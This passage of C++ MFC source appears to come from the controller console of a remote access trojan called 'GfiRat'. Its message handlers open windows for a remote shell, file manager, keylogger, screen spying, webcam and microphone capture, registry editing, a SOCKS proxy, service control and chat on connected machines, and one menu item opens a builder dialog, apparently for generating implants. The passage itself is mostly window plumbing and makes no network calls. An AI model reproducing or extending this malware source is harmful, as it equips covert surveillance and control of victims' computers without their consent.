	CShellDlg* dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CFileManagerDlg* dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CKeyBoardDlg* dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenscreenspydialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CScreenSpyDlg* dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

afx_msg LRESULT CGfiRatServerDlg::OnNewopenscreenspydialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	newCScreenSpyDlg* dlg = new newCScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = newSCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenpslistdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CSystemDlg* dlg = new CSystemDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;


	return 0;
}



afx_msg LRESULT CGfiRatServerDlg::OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CVideoDlg* dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;

}


afx_msg LRESULT CGfiRatServerDlg::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CAudioDlg* dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

afx_msg LRESULT CGfiRatServerDlg::OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CSpeakerDlg* dlg = new CSpeakerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SPEAKER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SPEAKER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpensysinfodialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CSysInfo* dlg = new CSysInfo(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenregeditdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CRegDlg* dlg = new CRegDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
	dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

afx_msg LRESULT CGfiRatServerDlg::OnOpenproxydialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CProxyDlg* dlg = new CProxyDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SOCKS, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = PROXY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnOpenpserlistdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CSerManager* dlg = new CSerManager(this, m_iocpServer, pContext);
	//设置父窗口为卓面
	dlg->Create(IDD_SERMANA, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}









afx_msg LRESULT CGfiRatServerDlg::OnOpenchatdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CChat* dlg = new CChat(this, m_iocpServer, pContext);

	// Settings父窗口为桌面
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}








void CGfiRatServerDlg::OnExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);
}


void CGfiRatServerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CGfiRatServerDlg* pMainFrame = (CGfiRatServerDlg*)AfxGetMainWnd();

	//写在这里否则会引起崩溃
	char pBuf[MAX_PATH];
	//获取应用程序完全路径
	GetModuleFileName(NULL, pBuf, MAX_PATH);
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION proc_info;
	memset(&startupinfo, 0, sizeof(STARTUPINFO));
	startupinfo.cb = sizeof(STARTUPINFO);
	if (m_bSetRestart == NULL)  //正常关闭
	{
		if (MessageBox(_T("确认退出程序吗?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
			return;


		m_iocpServer->Shutdown();
		delete m_iocpServer;
		CDialogEx::OnClose();
	}
	else
	{
	
		::CreateProcess(pBuf, NULL, NULL, NULL, FALSE,
			NORMAL_PRIORITY_CLASS, NULL, NULL, &startupinfo, &proc_info);

		exit(0);
	}
}


void CGfiRatServerDlg::OnBuild()
{
	// TODO: 在此添加命令处理程序代码
	BUID dlg;
	dlg.DoModal();
}


void CGfiRatServerDlg::OnSetting()
{
	// TODO: 在此添加命令处理程序代码
	CSetting dlg;
	dlg.DoModal();
}


void CGfiRatServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (SIZE_MINIMIZED == nType)
	{
		return;
	}


	if (g_pConnectView.m_hWnd != NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top = 1;         //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 160;   //列表的下坐标
		g_pConnectView.MoveWindow(rc);

		for (int i = 0; i < g_Column_Count; ++i) {           //遍历每一个列
			double Temp = g_Column_Data[i].nWidth;     //得到当前列的宽度   138
			Temp /= g_Column_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			g_pConnectView.SetColumnWidth(i, (lenth));       //设置当前的宽度
		}
	}

	if (g_pLogView.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy - 156;     //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 20;   //列表的下坐标
		g_pLogView.MoveWindow(rc);
		for (int i = 0; i < g_Log_Count; ++i) {           //遍历每一个列
			double Temp = g_Log_Data[i].nWidth;     //得到当前列的宽度
			Temp /= g_Log_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                                  //转换为int 类型
			g_pLogView.SetColumnWidth(i, (lenth));        //设置当前的宽度
		}
	}

	if (m_wndStatusBar.m_hWnd != NULL) {    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.left = 0;
		Rect.top = cy - 20;

		Rect.right = cx;
		Rect.bottom = cy;
		m_wndStatusBar.MoveWindow(Rect);
		//m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}







}
